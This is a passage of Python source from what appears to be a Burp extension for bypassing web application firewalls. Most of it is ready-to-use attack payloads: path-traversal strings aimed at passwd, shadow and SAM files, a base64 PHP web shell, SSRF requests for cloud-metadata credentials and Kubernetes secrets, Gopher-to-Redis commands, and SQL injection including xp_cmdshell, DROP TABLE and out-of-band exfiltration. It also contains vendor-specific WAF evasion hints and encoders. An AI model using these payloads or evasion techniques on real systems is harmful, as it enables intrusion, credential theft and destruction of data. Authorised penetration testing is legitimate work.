        "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=",
        "php:expect://id",
        "php:expect://ls",
        # ── LO's files: Overlong UTF-8 dot encoding (linux.txt / MYWORDLISTS) ─
        "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
        "%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af/etc/passwd",
        "%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/etc/passwd",
        "..%c0%af../..%c0%af../..%c0%af../etc/passwd",
        "/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd",
        # ── LO's files: %%hex double-percent encoding (linux.txt) ────────────
        "..%%32%66..%%32%66..%%32%66/etc/passwd",
        "%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66/etc/passwd",
        "..%%35%63..%%35%63..%%35%63/etc/passwd",
        # ── LO's files: Null byte + extension bypass (linux.txt) ─────────────
        "../../../../../../../../etc/passwd%00.html",
        "../../../../../../../../etc/passwd%00.jpg",
        "../../../../../../../../../boot.ini%00.html",
        # ── LO's files: Unique MYWORDLISTS entries ────────────────────────────
        "%00../../../../../../etc/passwd",
        "%00/etc/passwd%00",
        "%00../../../../../../etc/shadow",
        "/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow",
        "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini",
        "..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/boot.ini",
        # ── LO's files: Windows file paths (windows.txt) ─────────────────────
        "C:/Windows/System32/drivers/etc/hosts",
        "C:/Windows/Panther/Unattend/Unattended.xml",
        "C:/Windows/debug/NetSetup.log",
        "C:/Windows/system32/config/AppEvent.Evt",
        "C:/Windows/system32/config/regback/sam",
        "C:/Windows/system32/config/regback/system",
        "C:/Windows/System32/inetsrv/config/applicationHost.config",
        "C:/inetpub/logs/LogFiles/W3SVC1/u_exYYMMDD.log",
        "c:/xampp/phpMyAdmin/config.inc.php",
        "c:/wamp/bin/apache/apache2.2.22/conf/httpd.conf",
        "c:/xampp/apache/conf/httpd.conf",
    ],

    "SSRF": [
        # ── Standard localhost ─────────────────────────────────────────────────
        "http://127.0.0.1/",
        "http://localhost/",
        "http://127.0.0.1:80/",
        "http://127.0.0.1:8080/",
        "http://127.0.0.1:8443/",
        "http://127.0.0.1:443/",
        # ── IP variants (WAF IP blacklist bypass) ─────────────────────────────
        "http://0.0.0.0/",
        "http://0/",
        "http://127.1/",
        "http://127.0.1/",
        "http://127.00.1/",
        "http://0177.0.0.1/",         # Octal
        "http://0x7f000001/",          # Hex
        "http://2130706433/",          # Decimal
        "http://2130706433:80/",
        # ── IPv6 ──────────────────────────────────────────────────────────────
        "http://[::1]/",
        "http://[::]/",
        "http://[0:0:0:0:0:0:0:1]/",
        "http://[0:0:0:0:0:ffff:127.0.0.1]/",
        "http://[::ffff:127.0.0.1]/",
        "http://[::ffff:7f00:1]/",
        # ── AWS Instance Metadata ──────────────────────────────────────────────
        "http://169.254.169.254/",
        "http://169.254.169.254/latest/",
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/meta-data/hostname",
        "http://169.254.169.254/latest/user-data/",
        "http://169.254.169.254/latest/meta-data/local-ipv4",
        # ── Google Cloud Metadata ─────────────────────────────────────────────
        "http://metadata.google.internal/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://metadata.google.internal/computeMetadata/v1/project/project-id",
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        # ── Alibaba Cloud Metadata ────────────────────────────────────────────
        "http://100.100.100.200/latest/meta-data/",
        # ── Azure IMDS ────────────────────────────────────────────────────────
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        # ── Internal network ──────────────────────────────────────────────────
        "http://192.168.1.1/",
        "http://10.0.0.1/",
        "http://172.16.0.1/",
        "http://192.168.0.1/",
        # ── File protocol ─────────────────────────────────────────────────────
        "file:///etc/passwd",
        "file:///etc/hosts",
        "file:///C:/Windows/System32/drivers/etc/hosts",
        # ── Alternative protocols ─────────────────────────────────────────────
        "dict://127.0.0.1:6379/",
        "dict://127.0.0.1:6379/info",
        "gopher://127.0.0.1:6379/_PING",
        "ftp://127.0.0.1/",
        "sftp://127.0.0.1/",
        "ldap://127.0.0.1/",
        # ── HTTPS variants ────────────────────────────────────────────────────
        "https://127.0.0.1/",
        "https://localhost/",
        # ── Unicode IP bypass ─────────────────────────────────────────────────
        "http://①②⑧.⓪.⓪.①/",
        # ── Wave-3: Azure IMDS ────────────────────────────────────────────────
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
        # ── Wave-3: GCP metadata ──────────────────────────────────────────────
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        "http://metadata.google.internal/computeMetadata/v1/instance/attributes/",
        # ── Wave-3: DigitalOcean / Oracle Cloud ───────────────────────────────
        "http://169.254.169.254/metadata/v1/",
        "http://169.254.169.254/opc/v1/instance/",
        "http://169.254.169.254/openstack/",
        # ── Wave-3: Kubernetes ────────────────────────────────────────────────
        "http://kubernetes.default.svc/api/v1/namespaces/default/secrets/",
        "http://kubernetes.default.svc/api/v1/",
        "http://10.0.0.1/",
        "http://172.16.0.1/",
        "http://192.168.1.1/",
        # ── Wave-3: Docker API ────────────────────────────────────────────────
        "http://172.17.0.1:2375/v1.24/containers/json",
        "http://172.17.0.1:2376/v1.24/containers/json",
        "http://172.17.0.1:2375/version",
        # ── Wave-3: Gopher → Redis SSRF-to-RCE ───────────────────────────────
        "gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A",
        "gopher://127.0.0.1:6379/_*3%0D%0A$3%0D%0Aset%0D%0A$1%0D%0A1%0D%0A$35%0D%0A",
        # ── Wave-3: Gopher → SMTP relay ───────────────────────────────────────
        "gopher://127.0.0.1:25/_EHLO%20localhost%0D%0A",
        # ── Wave-3: Internal services ─────────────────────────────────────────
        "http://127.0.0.1:9200/",
        "http://127.0.0.1:9200/_cat/indices",
        "http://127.0.0.1:9200/_cluster/health",
        "http://127.0.0.1:11211/",
        "http://127.0.0.1:27017/",
        "http://127.0.0.1:5432/",
        "http://127.0.0.1:3306/",
        "http://127.0.0.1:8500/v1/agent/self",
        "http://127.0.0.1:8200/v1/sys/health",
        "http://127.0.0.1:4040/api/tunnels",
        "http://127.0.0.1:5601/",
        # ── Wave-3: IPv6 bypass ───────────────────────────────────────────────
        "http://[::1]/",
        "http://[::ffff:127.0.0.1]/",
        "http://[0:0:0:0:0:ffff:127.0.0.1]/",
        # ── Wave-3: DNS / hostname case bypass ────────────────────────────────
        "http://LocalHost/",
        "http://LOCALHOST/",
        "http://127.0.0.1.nip.io/",
        "http://localtest.me/",
        # ── Wave-3: Protocol alternatives ─────────────────────────────────────
        "file:///etc/passwd",
        "file:///c:/windows/win.ini",
        "dict://127.0.0.1:11211/",
        "ftp://127.0.0.1/",
    ],
}

# ═══════════════════════════════════════════════════════════════════════════════
#   SQL INJECTION PAYLOAD SEEDS  (used by Phase 4 tamper sweep)
#   One row per injection category.  Each entry: (label, [payloads...])
#   Payloads include realistic value prefixes ("test'", "1 ", "-1 "…) so
#   tamper functions operate on proper SQL fragments, not bare syntax.
# ═══════════════════════════════════════════════════════════════════════════════

SQLI_PAYLOAD_SEEDS = [
    ("bool-string", [
        "test' AND 1=1--",
        "test' AND 1=2--",
        "admin' OR '1'='1",
        "a' OR 'x'='x",
        "(test)' OR 1=1--",
        "test' AND 'a'='a",
        "x' OR 1=1 OR 'x'='y",
        "foo' OR 1=1 LIMIT 1--",
        "test') OR ('1'='1",
    ]),
    ("bool-numeric", [
        "1 AND 1=1--",
        "1 AND 1=2--",
        "0 OR 1=1--",
        "2-1 AND 1=1--",
        "1 AND TRUE--",
        "1) AND (1=1",
        "1)) OR ((1=1",
        "-1 OR 1=1--",
        "1 OR 2>1--",
    ]),
    ("error-mysql", [
        "test' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version))--",
        "test' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--",
        "test' AND EXP(~(SELECT * FROM (SELECT version())x))--",
        "1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT @@version),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "test' AND GTID_SUBSET(CONCAT(0x7e,(SELECT @@version),0x7e),1)--",
    ]),
    ("error-mssql", [
        "test' AND 1=CONVERT(INT,@@version)--",
        "test' AND 1=CONVERT(INT,(SELECT TOP 1 table_name FROM information_schema.tables))--",
        "1' AND 1 IN (SELECT @@version)--",
    ]),
    ("error-pgsql", [
        "test' AND 1=CAST((SELECT version()) AS NUMERIC)--",
        "test' AND 1=CAST((SELECT current_user) AS NUMERIC)--",
    ]),
    ("error-oracle", [
        "test' AND 1=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||(SELECT banner FROM v$version WHERE ROWNUM=1)||CHR(62))) FROM DUAL)--",
    ]),
    ("time-mysql", [
        "test' AND SLEEP(5)--",
        "test' OR SLEEP(5)--",
        "1 AND IF(1=1,SLEEP(5),0)--",
        "1 AND IF(ASCII(SUBSTRING(database(),1,1))>90,SLEEP(5),0)--",
        "test' AND BENCHMARK(5000000,MD5('test'))--",
        "test' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--",
        "test' AND ELT(1=1,SLEEP(5))--",
    ]),
    ("time-mssql", [
        "1; WAITFOR DELAY '0:0:5'--",
        "test'; WAITFOR DELAY '0:0:5'--",
    ]),
    ("time-pgsql", [
        "test' AND (SELECT 1 FROM PG_SLEEP(5))=1--",
        "1; SELECT pg_sleep(5)--",
    ]),
    ("time-oracle", [
        "test' AND DBMS_PIPE.RECEIVE_MESSAGE('RDS',5)=1--",
    ]),
    ("time-sqlite", [
        "1 AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))--",
    ]),
    ("union-1col", [
        "test' UNION SELECT NULL--",
        "-1' UNION SELECT 1--",
        "-1 UNION SELECT NULL--",
    ]),
    ("union-2col", [
        "test' UNION SELECT NULL,NULL--",
        "-1' UNION SELECT 1,2--",
        "test' UNION SELECT @@version,NULL--",
        "test' UNION SELECT user(),database()--",
    ]),
    ("union-3col", [
        "test' UNION SELECT NULL,NULL,NULL--",
        "-1' UNION SELECT 1,2,3--",
        "test' UNION SELECT 1,CONCAT(0x7e,@@version,0x7e),3--",
        "-1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--",
    ]),
    ("union-all", [
        "test' UNION ALL SELECT NULL,NULL--",
        "-1' UNION ALL SELECT 1,2,3--",
        "0' UNION SELECT username,password,3 FROM users--",
    ]),
    ("stacked", [
        "test'; SELECT 1--",
        "test'; INSERT INTO users VALUES(1,'hacked','hacked')--",
        "1; EXEC xp_cmdshell('whoami')--",
        "test'; DROP TABLE users--",
    ]),
    ("oob", [
        "test' AND LOAD_FILE(CONCAT('\\\\\\\\',@@version,'.oob.example.com\\\\a'))--",
    ]),
    ("generic-waf-bypass", [
        "' un/**/ion sel/**/ect 1,2,3--",
        "' /*!UNION*/ /*!SELECT*/ 1,2,3--",
        "1/*comment*/AND/**/1=1/**/--",
        "1/*!12345UNION*//*!12345SELECT*/1--",
        "(1)AND(1)=(1)--",
    ]),
    # ── From LO's whitespace bypass file (tab/LF/CR/VT/FF/NBSP) ─────────────
    ("whitespace-ws-bypass", [
        "%09AND%091=1%09--",
        "%0AAND%0A1=1%0A--",
        "%0DAND%0D1=1%0D--",
        "%0CAND%0C1=1%0C--",
        "%0BAND%0B1=1%0B--",
        "%A0AND%A01=1%A0--",
        "%09OR%091=1%09--",
        "%0AOR%0A1=1%0A--",
    ]),
    # ── RLIKE / REGEXP detection (MySQL) ─────────────────────────────────────
    ("rlike-detection", [
        "1 RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END))",
        "1 RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END))",
        "' RLIKE SLEEP(3)-- -",
        "' REGEXP 0x61646d696e-- -",
    ]),
    # ── Mixed case + parentheses (no whitespace needed) ──────────────────────
    ("no-space-parens", [
        "(1)oR(1=1)--",
        "(1)aND(1=1)--",
        "'oR(2)LiKE(2)-- -",
        "'oR true-- -",
        "'||true-- -",
        "'||2=2-- -",
        "'oR'2'LiKE'2'-- -",
        "'oR'2'='2'oR'",
    ]),
    # ── GBK / multibyte prefix injection ─────────────────────────────────────
    ("gbk-prefix", [
        "%bf' OR 1=1-- -",
        "%A8%27 OR 1=1-- -",
        "%8C%A8%27 OR 1=1-- -",
        "%bf') OR ('1'='1-- -",
    ]),
    # ── UNION parentheses form (no spaces) ───────────────────────────────────
    ("union-no-space", [
        "'UniON(SElecT(1),2)-- -",
        "'UniON(SElecT(1),2,3)-- -",
        "'UniON(SElecT(1),2,3,4)-- -",
        "'UniON(SElecT(1),2,3,4,5)-- -",
    ]),
    # ── Auth bypass specialised ───────────────────────────────────────────────
    ("auth-bypass-ext", [
        "admin'--",
        "admin' #",
        "admin'/*",
        "ffifdyop",
        "' or username like '%",
        "' group by password having 1=1--",
    ]),
    # ── Time-based (all DBs) ─────────────────────────────────────────────────
    ("time-all-db", [
        "' AND SLEEP(3)-- -",
        "' OR SLEEP(3)-- -",
        "'; WAITFOR DELAY '0:0:3'-- -",
        "' AND pg_sleep(3)-- -",
        "' OR pg_sleep(3)-- -",
        "' AND RANDOMBLOB(300000000/2)-- -",
        "' AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(300000000/2))))-- -",
        "' AND benchmark(5000000,MD5(1))-- -",
        "' AND (SELECT * FROM (SELECT(SLEEP(3)))x)-- -",
        "' AND (SELECT SLEEP(3) FROM dual WHERE 1=1)-- -",
    ]),
    # ── UNION-based column detection ─────────────────────────────────────────
    ("union-col-detect", [
        "' ORDER BY 1-- -",
        "' ORDER BY 2-- -",
        "' ORDER BY 3-- -",
        "' ORDER BY 4-- -",
        "' ORDER BY 5-- -",
        "' ORDER BY 6-- -",
        "' ORDER BY 7-- -",
        "' ORDER BY 8-- -",
        "' UNION SELECT NULL-- -",
        "' UNION SELECT NULL,NULL-- -",
        "' UNION SELECT NULL,NULL,NULL-- -",
        "' UNION SELECT NULL,NULL,NULL,NULL-- -",
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL-- -",
    ]),
    # ── JSON-inline (Claroty Team82) ─────────────────────────────────────────
    ("json-inline-sqli", [
        "' OR JSON_LENGTH('{}')<=8896-- -",
        "' OR JSON_VALID('1')-- -",
        "' UNION distinctrow SELECT NULL,NULL,NULL-- -",
        "' UNION distinctrow SELECT @@version,NULL,NULL-- -",
        "' OR JSON_OBJECT('a',1)=JSON_OBJECT('a',1)-- -",
        "' OR JSON_EXTRACT('{\"a\":1}','$.a')=1-- -",
    ]),
]

# ═══════════════════════════════════════════════════════════════════════════════
#   EXTERNAL SQLI SEED LOADER
#   Reads sqli/*.txt files next to waf.py, deduplicates against the static
#   seeds above and PAYLOADS["SQL Injection"], then extends SQLI_PAYLOAD_SEEDS
#   with new categories.  Only non-duplicate payloads are kept; each file
#   category contributes at most MAX_PER_CAT spread-sampled entries so the
#   tamper sweep doesn't blow up in size.
# ═══════════════════════════════════════════════════════════════════════════════

def _spread_sample(lst, n):
    """
    Return n items spread evenly across lst (first item always included).
    Safe to call with n > len(lst) — returns the full list in that case.
    """
    if not lst:
        return []
    if len(lst) <= n:
        return list(lst)
    step = (len(lst) - 1) / float(n - 1) if n > 1 else 0
    return [lst[int(round(i * step))] for i in range(n)]


def _load_ext_sqli_seeds():
    """
    Extend SQLI_PAYLOAD_SEEDS with payloads from the sqli/ directory.

    Deduplication rules
    ───────────────────
    1. Normalise each candidate to lowercase + strip for comparison only.
    2. Skip exact normalised duplicates of anything already in SQLI_PAYLOAD_SEEDS
       or PAYLOADS["SQL Injection"].
    3. Skip blank lines and comment lines (starting with #).
    4. Replace __TIME__ placeholder (wapiti templates) with literal 5.
    5. Skip obvious NoSQL payloads ($where, $ne, $gt …) — wrong injection type.

    Sampling
    ────────
    Each file contributes at most MAX_PER_CAT payloads chosen via
    _spread_sample() so structural diversity is maximised while volume
    stays bounded.  The tamper sweep uses these as extra seeds.
    """
    MAX_PER_CAT = 30    # max seeds stored per file category

    # ── Build normalised dedup set from everything already defined ────────────
    seen_norm = set()
    for _, seeds in SQLI_PAYLOAD_SEEDS:
        for p in seeds:
            seen_norm.add(p.lower().strip())
    for p in PAYLOADS.get("SQL Injection", []):
        seen_norm.add(p.lower().strip())

    # ── Locate sqli/ directory ────────────────────────────────────────────────
    try:
        ext_dir = _os.path.dirname(_os.path.abspath(__file__))
    except (NameError, TypeError):
        # __file__ not available in this Burp/Jython environment — try cwd
        ext_dir = _os.getcwd()
    sqli_dir = _os.path.join(ext_dir, "sqli")

    # ── NoSQL / irrelevant pattern filter ─────────────────────────────────────
    _NOSQL_SKIP = (
        "$where", "$ne", "$gt", "$lt", "$or", "$and",
        "[$ne]", "[$gt]", "{$", "mongodb",
        "031003000", "0x73006500",  # wide-char SQL strings — noise
    )

    # ── File → category mapping ───────────────────────────────────────────────
    FILE_MAP = [
        ("ext-error-based",   "SQLI-ERROR-BASED-LULU.txt"),
        ("ext-time-based",    "SQLI-TIMED-BASED-LULUI.txt"),
        ("ext-union-based",   "SQLi-UNION-BASED-LULU.txt"),
        ("ext-probe",         "SQLI-PROMPT-LULU.txt"),
        ("ext-login-bypass",  "login_byppas.txt"),
        ("ext-huge",          "huge-sqli.txt"),
    ]

    result = list(SQLI_PAYLOAD_SEEDS)   # start from the static list

    for cat_label, fname in FILE_MAP:
        fpath = _os.path.join(sqli_dir, fname)
        candidates = []

        try:
            with open(fpath, 'r') as fh:
                for raw in fh:
                    p = raw.strip()
                    # Skip empties and comments
                    if not p or p.startswith('#'):
                        continue
                    # Replace wapiti __TIME__ templates
                    p = p.replace('__TIME__', '5')
                    # Skip NoSQL / unrelated entries
                    p_lc = p.lower()
                    if any(tok in p_lc for tok in _NOSQL_SKIP):
                        continue
                    # Dedup
                    if p_lc in seen_norm:
                        continue
                    candidates.append(p)
                    seen_norm.add(p_lc)   # mark so later files don't re-add
        except Exception:
            continue     # file missing or unreadable — skip silently

        if not candidates:
            continue

        # Spread-sample down to MAX_PER_CAT, preserving structural diversity
        sampled = _spread_sample(candidates, MAX_PER_CAT)
        result.append((cat_label, sampled))

    return result


SQLI_PAYLOAD_SEEDS = _load_ext_sqli_seeds()

# ═══════════════════════════════════════════════════════════════════════════════
#   WAF DETECTION SIGNATURES
# ═══════════════════════════════════════════════════════════════════════════════

WAF_STATUS_CODES = {400, 403, 406, 419, 429, 503}

WAF_BODY_PATTERNS = [
    r"forbidden",
    r"blocked",
    r"access denied",
    r"request rejected",
    r"detected as attack",
    r"request has been blocked",
    r"your ip.*(?:has been|is) blocked",
    r"security violation",
    r"malicious",
    r"illegal request",
    r"\bwaf\b",
    r"web application firewall",
    r"cloudflare",
    r"sucuri",
    r"incapsula",
    r"f5\s+big-ip",
    r"barracuda",
    r"modsecurity",
    r"mod_security",
    r"intrusion detected",
    r"attack detected",
    r"akamai",
    r"sorry.{0,30}blocked",
    r"error 1010",
    r"error 1006",
    r"error 1015",
    r"attention required",
    r"security check",
    r"ddos protection",
    r"please wait.*verifying",
]

# ── Per-vendor WAF fingerprint signatures ─────────────────────────────────────
# Maps vendor key → dicts of header patterns, body patterns, indicative statuses.
# Headers are matched against the full lowercased response header block (name+value).
WAF_VENDOR_SIGNATURES = {
    "cloudflare": {
        "headers": [r"cf-ray", r"cf-cache-status", r"cf-request-id",
                    r"server:\s*cloudflare"],
        "body":    [r"cloudflare", r"error\s+101[05]", r"error\s+1020",
                    r"cf\.mitigate", r"attention required.*cloudflare",
                    r"ray\s+id:"],
        "status":  {403, 503},
    },
    "imperva": {
        "headers": [r"x-iinfo", r"incap_ses", r"visid_incap",
                    r"x-cdn:\s*imperva", r"x-protected-by:\s*incapsula"],
        "body":    [r"incapsula", r"incapsula incident id",
                    r"request blocked.*imperva", r"_incap_"],
        "status":  {403},
    },
    "modsecurity": {
        "headers": [r"server:.*mod_security", r"server:.*modsecurity",
                    r"x-powered-by:.*modsecurity"],
        "body":    [r"mod_security", r"modsecurity", r"rules?\s+violation",
                    r"not acceptable.*406", r"this error.*generated by mod"],
        "status":  {403, 406},
    },
    "f5": {
        "headers": [r"^ts[0-9a-f]{8,}", r"x-waf-status", r"server:\s*bigip"],
        "body":    [r"the requested url was rejected", r"f5\s+big.?ip",
                    r"support id:", r"please consult.*support id"],
        "status":  {403},
    },
    "akamai": {
        "headers": [r"x-check-cacheable", r"akamai-grn",
                    r"x-akamai", r"server:\s*akamaighost"],
        "body":    [r"akamai", r"reference.*akamai",
                    r"access denied.*akamai", r"ghost"],
        "status":  {403},
    },
    "aws_waf": {
        "headers": [r"x-amzn-requestid", r"x-amz-cf-id",
                    r"x-amzn-trace-id"],
        "body":    [r"aws.*waf", r"403 forbidden.*aws",
                    r"request blocked by aws"],
        "status":  {403},
    },
    "barracuda": {
        "headers": [r"x-barracuda-waf", r"barra_counter_session"],
        "body":    [r"barracuda", r"barracuda web application firewall",
                    r"barracuda networks"],
        "status":  {400, 403},
    },
    "sucuri": {
        "headers": [r"x-sucuri-id", r"x-sucuri-cache"],
        "body":    [r"sucuri", r"access denied.*sucuri",
                    r"website firewall.*sucuri"],
        "status":  {403},
    },
    "fortinet": {
        "headers": [r"x-fw-", r"server:\s*fortigate", r"fortiwebsessid"],
        "body":    [r"fortigate", r"fortiweb", r"fortinet",
                    r"your request was blocked by fortiweb"],
        "status":  {403},
    },
}

# Vendor-specific bypass hints — which techniques historically work against each vendor.
# Used to log targeted recommendations to the tester after fingerprinting.
WAF_VENDOR_BYPASS_HINTS = {
    "cloudflare":  ["charset_ibm037", "tamper:htmlencode", "whitespace", "chunked",
                    "gzip_body"],
    "imperva":     ["tamper:space2comment", "tamper:greatest_bypass", "charset",
                    "junk", "json_body"],
    "modsecurity": ["tamper:modsecurityversioned", "tamper:modsecurityzeroversioned",
                    "tamper:space2comment", "junk", "whitespace"],
    "f5":          ["tamper:charencode", "header", "chunked", "gzip_body"],
    "akamai":      ["junk", "tamper:randomcase", "header", "json_body"],
    "aws_waf":     ["tamper:charencode", "header", "charset", "json_body"],
    "barracuda":   ["whitespace", "tamper:space2comment", "junk"],
    "sucuri":      ["tamper:htmlencode", "charset_ibm037", "whitespace"],
    "fortinet":    ["tamper:charencode", "tamper:space2comment", "chunked"],
}

# ═══════════════════════════════════════════════════════════════════════════════
#   SUCCESS / VULNERABILITY INDICATORS
# ═══════════════════════════════════════════════════════════════════════════════

SUCCESS_PATTERNS = {
    "XSS": [
        r"<script>alert\(1\)</script>",
        r"<script>confirm\(1\)</script>",
        r"onerror=alert\(",
        r"onload=alert\(",
        r"javascript:alert",
        r"<svg[^>]+onload=",
        r"<img[^>]+onerror=",
        # ── Wave-3 additions ──────────────────────────────────────────────────
        r"onerror\s*=",
        r"onload\s*=",
        r"onfocus\s*=",
        r"onclick\s*=",
        r"ontoggle\s*=",
        r"onmouseover\s*=",
        r"onpointerover\s*=",
        r"onstart\s*=",
        r"javascript\s*:",
        r"<svg[^>]+on\w+=",
        r"alert\s*\(",
        r"confirm\s*\(1\)",
        r"\{\{.*constructor",
        r"srcdoc\s*=",
        r"<details[^>]+ontoggle",
    ],
    "SQL Injection": [
        r"you have an error in your sql syntax",
        r"mysql_fetch",
        r"warning:\s*mysql",
        r"unclosed quotation mark",
        r"quoted string not properly terminated",
        r"syntax error.*sql",
        r"microsoft ole db",
        r"odbc.*error",
        r"ora-\d{5}",
        r"pg::syntaxerror",
        r"sqlite[._]exception",
        r"sql\s+error",
        r"supplied argument is not a valid mysql",
        r"db2 sql error",
        r"invalid query",
    ],
    "Command Injection": [
        r"uid=\d+\(",
        r"root:.*:0:0",
        r"daemon:.+:\d+:\d+",
        r"bin:.+:\d+:\d+",
        r"\[sudo\]",
        r"sh:.*not found",
        r"command not found",
        r"Volume in drive [A-Z]",
        r"Directory of",
        r"Windows IP Configuration",
        r"Linux\s+\S+\s+\d+\.\d+",
    ],
    "LFI": [
        r"root:x:0:0",
        r"root:.*:0:0:",
        r"/bin/bash",
        r"/bin/sh",
        r"daemon:x:",
        r"\[boot loader\]",
        r"\[operating systems\]",
        r"for 16-bit app",
        r"\[extensions\]",
        r"PROCESSOR_IDENTIFIER",
    ],
    "SSRF": [
        r'"ami-id"',
        r'"instance-id"',
        r'"local-ipv4"',
        r"computeMetadata",
        r"iam/security-credentials",
        r"latest/meta-data",
        r"169\.254\.169\.254",
        r"metadata\.google\.internal",
        r"x-aws-ec2",
        # ── Wave-3: Azure ─────────────────────────────────────────────────────
        r'"computeName"',
        r'"subscriptionId"',
        r'"resourceGroupName"',
        r"oauth2/token.*azure",
        # ── Wave-3: GCP ───────────────────────────────────────────────────────
        r'"projectId"',
        r'"numericProjectId"',
        r'"serviceAccounts"',
        # ── Wave-3: Kubernetes / Docker ───────────────────────────────────────
        r'"serviceAccountToken"',
        r"kubernetes\.default\.svc",
        r'"ApiVersion":\s*"v1"',
        r'\[\{"Id":"[a-f0-9]{12}',
        # ── Wave-3: Redis / internal services ────────────────────────────────
        r"\+PONG",
        r"elasticsearch",
        r"cluster_name.*elasticsearch",
        r'"cluster_name"',
        # ── Wave-3: File-protocol SSRF confirmation ───────────────────────────
        r"root:x:0:0",
        r"\[extensions\]",
        # ── Wave-3: Error-based SSRF confirmation ─────────────────────────────
        r"Connection refused",
        r"ECONNREFUSED",
        r"No route to host",
    ],
}

# ═══════════════════════════════════════════════════════════════════════════════
#   IBM037 (EBCDIC) ENCODING TABLE
#   Source: article technique — charset=ibm037 bypasses UTF-8-only WAF analysis
#   Keep '=' and '&' un-encoded (URL structural chars, per article note)
# ═══════════════════════════════════════════════════════════════════════════════

_IBM037 = {
    ' ':0x40,'!':0x5A,'"':0x7F,'#':0x7B,'$':0x5B,'%':0x6C,"'":0x7D,
    '(':0x4D,')':0x5D,'*':0x5C,'+':0x4E,',':0x6B,'-':0x60,'.':0x4B,
    '/':0x61,'0':0xF0,'1':0xF1,'2':0xF2,'3':0xF3,'4':0xF4,'5':0xF5,
    '6':0xF6,'7':0xF7,'8':0xF8,'9':0xF9,':':0x7A,';':0x5E,'<':0x4C,
    '>':0x6E,'?':0x6F,'@':0x7C,'A':0xC1,'B':0xC2,'C':0xC3,'D':0xC4,
    'E':0xC5,'F':0xC6,'G':0xC7,'H':0xC8,'I':0xC9,'J':0xD1,'K':0xD2,
    'L':0xD3,'M':0xD4,'N':0xD5,'O':0xD6,'P':0xD7,'Q':0xD8,'R':0xD9,
    'S':0xE2,'T':0xE3,'U':0xE4,'V':0xE5,'W':0xE6,'X':0xE7,'Y':0xE8,
    'Z':0xE9,'[':0xAD,'\\':0xE0,']':0xBD,'^':0x5F,'_':0x6D,'`':0x79,
    'a':0x81,'b':0x82,'c':0x83,'d':0x84,'e':0x85,'f':0x86,'g':0x87,
    'h':0x88,'i':0x89,'j':0x91,'k':0x92,'l':0x93,'m':0x94,'n':0x95,
    'o':0x96,'p':0x97,'q':0x98,'r':0x99,'s':0xA2,'t':0xA3,'u':0xA4,
    'v':0xA5,'w':0xA6,'x':0xA7,'y':0xA8,'z':0xA9,
}

def ibm037_encode(text):
    """Percent-encode text in IBM037 (EBCDIC).  '=' and '&' are kept raw."""
    out = []
    for ch in text:
        if ch in ('=', '&'):
            out.append(ch)
        elif ch in _IBM037:
            out.append('%%%02X' % _IBM037[ch])
        else:
            try:
                out.append('%%%02X' % ord(ch))
            except Exception:
                out.append(ch)
    return ''.join(out)


def _gzip_compress(data_bytes):
    """
    Manually wrap raw deflate data in a valid gzip container.
    Uses only _zlib (java.util.zip bridge) and _struct — no gzip module needed.
    Returns a bytearray suitable for use as a gzip-encoded request body.
    """
    data = bytes(data_bytes)
    compressed = _zlib.compress(data, 9)
    crc  = _zlib.crc32(data) & 0xFFFFFFFF
    size = len(data) & 0xFFFFFFFF
    # Strip zlib 2-byte header and 4-byte Adler-32 trailer to get raw DEFLATE stream
    raw_deflate = compressed[2:-4]
    gzip_header = bytearray([
        0x1f, 0x8b,   # gzip magic
        0x08,         # compression method: deflate
        0x00,         # flags: none
        0x00, 0x00, 0x00, 0x00,  # mtime: 0 (unknown)
        0x02,         # xfl: maximum compression
        0xFF,         # OS: unknown
    ])
    gzip_footer = bytearray(_struct.pack('<II', crc, size))
    return gzip_header + bytearray(raw_deflate) + gzip_footer


def _json_unicode_escape(payload):
    """
    Escape every character in payload as \\uXXXX.
    WAF signature patterns won't match; JSON parsers decode before handing to app.
    Works on both str (Python 2) and unicode.
    """
    try:
        if not isinstance(payload, unicode):
            payload = payload.decode('utf-8', errors='replace')
        return u''.join(u'\\u%04x' % ord(c) for c in payload)
    except Exception:
        return u''.join(u'\\u%04x' % ord(c) for c in str(payload))


def _chunked_encode(body_bytes, chunk_size=1):
    """
